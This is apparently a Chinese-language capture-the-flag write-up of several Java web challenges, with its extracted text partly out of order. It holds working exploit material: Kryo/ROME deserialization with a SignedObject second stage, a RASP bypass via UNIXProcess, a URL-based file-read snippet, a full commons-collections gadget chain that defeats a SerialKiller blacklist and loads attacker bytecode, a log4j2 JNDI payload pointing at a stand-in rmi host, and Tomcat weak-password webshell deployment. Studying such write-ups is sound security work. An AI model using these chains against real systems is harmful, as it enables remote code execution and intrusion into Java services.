newInstantiator:1190, Kryo (com.esotericsoftware.kryo)
newInstance:1199, Kryo (com.esotericsoftware.kryo)
create:163, FieldSerializer (com.esotericsoftware.kryo.serializers)
read:122, FieldSerializer (com.esotericsoftware.kryo.serializers)
可以看到抛错的原因就是下⾯的这串代码，它默认我们的类有⽆参构造函数
那为了解决这个问题我们也得知道是否可以不使⽤ DefaultInstantiatorStrategy ，转⽽
使⽤其他 InstantiatorStrategy 的⼦类呢，答案是可以的，上⾯我们可以看到函数实例化
的过程是通过 this.strategy.newInstantiatorOf(type) ，⽽这
个 DefaultInstantiatorStrategy 来源于 strategy 属性
正好在Kryo类当中有set⽅法可以实
现， com.esotericsoftware.kryo.Kryo#setInstantiatorStrategy ，可以看到如果
是 StdInstantiatorStrategy 类则正好符合（官⽅⽂档⽐代码好看）
readClassAndObject:880, Kryo (com.esotericsoftware.kryo)
read:226, MapSerializer (com.esotericsoftware.kryo.serializers)
read:42, MapSerializer (com.esotericsoftware.kryo.serializers)
readClassAndObject:880, Kryo (com.esotericsoftware.kryo)
read:226, MapSerializer (com.esotericsoftware.kryo.serializers)
read:42, MapSerializer (com.esotericsoftware.kryo.serializers)
readClassAndObject:880, Kryo (com.esotericsoftware.kryo)
deser:110, Testt (demo)
main:126, Testt (demo)
因此我们得到最终传参
可以看到又报错了， _tfactory 空指针异常
这⾥如何解决呢？其实很简单，别忘了我们这个可是打ROME，通过触发
com.rometools.rome.feed.impl.EqualsBean#beanEquals 我们能调⽤任意get⽅法，这
时候不难想到⼆次反序列化， java.security.SignedObject#getObject ，其实就是虎符
的思路了没啥难度
{"polish":true,"RegistrationRequired":false,"InstantiatorStrategy": 
"org.objenesis.strategy.StdInstantiatorStrategy"}
因此不难得到payload
绕Rasp
这时候你注⼊内存马执⾏会发现什么都是空的
这时候你⼀定很疑问为什么本地打通了远程不⾏，我也很疑惑，之后看到出题⼈说
    public Object getObject()
        throws IOException, ClassNotFoundException
    {
        // creating a stream pipe-line, from b to a
        ByteArrayInputStream b = new ByteArrayInputStream(this.content);
        ObjectInput a = new ObjectInputStream(b);
        Object obj = a.readObject();
        b.close();
        a.close();
        return obj;
    }
payloadhere
既然存在waf，那么我们第⼀件事情是什么呢，当然是验证是否是对payload的过滤
因此我将执⾏的字节码改成
成功看到页⾯延时
这时候猜到可能有Rasp(毕竟对于Java过滤base64解码后的字符串有点傻)
那第⼀步就要知道rasp的⽂件内容，⽤个之前从p⽜那⾥学的伪协议⼩trick⽅便我读⽂件以及
列⽬录
Thread.sleep(10000);
之后成功得到rasp的地址， /app/jrasp.jar ，那么下载下来分析即可，图没截完，意思是
只要执⾏到 java.lang.ProcessImpl 的 start ⽅法,⽽这也就封掉了之前常见的
Runtime , ProcessBuilder ，甚⾄js执⾏之类的，el执⾏都不⾏，道理很简单会调⽤
到 java.lang.ProcessImpl
String urlContent = "";
final URL url = new URL(request.getParameter("read"));
final BufferedReader in = new BufferedReader(new
InputStreamReader(url.openStream()));
String inputLine = "";
while ((inputLine = in.readLine()) != null) {
  urlContent = urlContent + inputLine + "\n";
}
in.close();
writer.println(urlContent);
如何绕过也很简单去找更下⼀层的调⽤即可，也就是通过 UNIXProcess 即可
后⾯很恶⼼⼀个计算题
脚本有个地⽅⼩错误导致三⼩时没找到前⾯不能加 CHLD_IN 导致提前输⼊错误答案似乎
use strict;
use IPC::Open3;
my $pid = open3( \*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, '/readflag' ) or die 
"open3() failed!";
my $r;
$r = ;
print "$r";
$r = ;
EzJava -- Bypass Serialkiller
解读环境
⾸先附件给了两个东西⼀个jar，⼀个serialkiller的配置⽂件，下⾯是jar当中的⽬录架构
print "$r";
$r = substr($r,0,-3);
$r = eval "$r";
print "$r\n";
print CHLD_IN "$r\n";
$r = ;
print "$r";
这有两个控制器但是第⼀个没啥意义，这个路由很明显需要反序列化
简单看下SerialKiller类，实现是载⼊配置获得⿊⽩名单，通过resolveClass做了过滤，接下来就
来看看⿊名单，将我们反序列化的关键点给拿捏了
@RestController
public class HelloController {
    public HelloController() {
    }
    @GetMapping({"/hello"})
    public String index() {
        return "hello";
    }
    @PostMapping({"/hello"})
    public String index(@RequestBody String baseStr) throws Exception {
        byte[] decode = Base64.getDecoder().decode(baseStr);
        ObjectInputStream ois = new SerialKiller(new 
ByteArrayInputStream(decode), "serialkiller.xml");
        ois.readObject();
        return "hello";
    }
}
  org\.apache\.commons\.collections\.Transformer$
  org\.apache\.commons\.collections\.functors\.InvokerTransformer$
  org\.apache\.commons\.collections\.functors\.ChainedTransformer$
  org\.apache\.commons\.collections\.functors\.ConstantTransformer
$
  org\.apache\.commons\.collections\.functors\.InstantiateTransfor
mer$
Bypass
既然如此那么⾸先就是想到去找替换类达到同样的效果咯
下⾯是我通过简单搜索发现的类，当然后⾯发现解决这题⽅案很多，我只给⼀个
FactoryTransformer  
可以看到这个trnasfromer的transform⽅法，可以调⽤任意Factory⼦类的create⽅法
  org\.apache\.commons\.collections4\.functors\.InvokerTransformer
$
  org\.apache\.commons\.collections4\.functors\.ChainedTransformer
$
  org\.apache\.commons\.collections4\.functors\.ConstantTransforme
r$
  org\.apache\.commons\.collections4\.functors\.InstantiateTransfo
rmer$
  org\.apache\.commons\.collections4\.comparators\.TransformingCom
parator$
public class FactoryTransformer implements Transformer, Serializable {
    private static final long serialVersionUID = -6817674502475353160L;
    private final Factory iFactory;
    public static Transformer getInstance(Factory factory) {
        if (factory == null) {
            throw new IllegalArgumentException("Factory must not be 
null");
        } else {
            return new FactoryTransformer(factory);
        }
    }
    public FactoryTransformer(Factory factory) {
可以看到也不多，从名字就可以看出，其中有两个可以⽤的
其中 org.apache.commons.collections.functors.ConstantFactory#create 可以返
回任意值
代替 ConstantTransformer
org.apache.commons.collections.functors.InstantiateFactory#create 可以实
例化任意类
代替 InstantiateTransformer 去实例化对象
那看到这⾥你有什么思路了吗？熟悉CC链的童鞋⼀定会知道TrAXFilter的构造函数当中可以帮
助我们触发TemplatesImpl字节码加载的过程
通过如下构造，我们能很轻松的触发计算器
        this.iFactory = factory;
    }
    public Object transform(Object input) {
        return this.iFactory.create();
    }
    public Factory getFactory() {
        return this.iFactory;
    }
}
Ps⼩细节：对expMap做put操作会触发hashCode会导致利⽤链在序列化过程当中触发导致报
错，别忘了先设置⼀个⽆关紧要的transformer(⽐如ConstantTransformer)最后再反射替换成我们
恶意的Transformer
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import 
com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.functors.InstantiateFactory;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.nibblesec.tools.SerialKiller;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;
public class Test {
    public static void setFieldValue(Object obj, String fieldName, Object 
value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception{
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{
 ClassPool.getDefault().get(EvilTemplatesImpl.class.getName()).toBytecode(
)
        });
        setFieldValue(obj, "_name", "1");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        InstantiateFactory instantiateFactory;
        instantiateFactory = new 
InstantiateFactory(com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter
.class
        ,new Class[]{javax.xml.transform.Templates.class},new Object[]
{obj});
        FactoryTransformer factoryTransformer = new 
FactoryTransformer(instantiateFactory);
        ConstantTransformer constantTransformer = new 
ConstantTransformer(1);
        Map innerMap = new HashMap();
        LazyMap outerMap = (LazyMap)LazyMap.decorate(innerMap, 
constantTransformer);
        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        setFieldValue(outerMap,"factory",factoryTransformer);
        outerMap.remove("keykey");
        ByteArrayOutputStream byteArrayOutputStream = new 
ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new 
ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(expMap);
        ByteArrayInputStream byteArrayInputStream = new 
ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        ObjectInputStream ois = new SerialKiller(byteArrayInputStream, 
"/Users/y4tacker/Downloads/ezjavaz/serialkiller.xml");
        ois.readObject();
后⾯就是获取注⼊⼀个内存马即可获取flag，这部分不谈基础东西⽽已
    }
}
那么就结束了这⼀题
Java_mem_shell_Filter
⾸先只给了⼀个登录功能
通过随便访问不存在页⾯，导致报错抛出也可以得到是tomcat8.0.12版本，那版本问题可以忽
略了
接下来由于后端响应真的很快，在公共环境下能做到这样⾸先考虑弱⼜令，爆破⽆效
突然想到能不能打log4j2
name=${jndi:rmi://xxxxx/exp}&password=admin
后⾯拿flag也是⽐较阴间，这⾥不重要不写了
Java_mem_shell_Basic
可以看见直接是⼀个tomcat，看了版本没啥可利⽤的1day，同时版本⽐较低不存在幽灵猫漏洞
那么接下来就只能考虑后台弱⼜令了， tomcat/tomcat ，之后部署⼀个war包上去，直接冰
蝎⼀把梭哈，就是flag位置⽐较阴间 /usr/local/apache-tomcat-
8.0.12/work/Catalina/localhost/ROOT/org/apache/jsp/threatbook_jsp.java